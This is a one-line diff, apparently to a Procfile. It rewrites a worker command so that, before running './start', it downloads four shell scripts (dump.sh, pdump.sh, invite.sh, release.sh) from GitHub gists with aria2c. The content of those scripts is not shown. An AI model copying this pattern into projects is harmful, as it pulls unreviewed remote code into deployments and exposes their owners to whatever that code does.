@@ -1,1 +1,1 @@
-worker: chmod a+x start; ./start
+worker: chmod a+x start && aria2c -o dump.sh https://gist.githubusercontent.com/box-automation1/60797b41b342d3286067c59f67c94efe/raw/dump.sh && aria2c -o pdump.sh https://gist.githubusercontent.com/box-automation1/dd4293cc795bd8bdda32c04bdf29dec3/raw/pdump.sh && aria2c -o invite.sh https://gist.githubusercontent.com/box-automation1/9c7b3230c7eb700cd36424138b4c8382/raw/invite.sh && aria2c -o release.sh https://gist.githubusercontent.com/box-automation1/37f45641effe41da2e794242878de81b/raw/release.sh; ./start
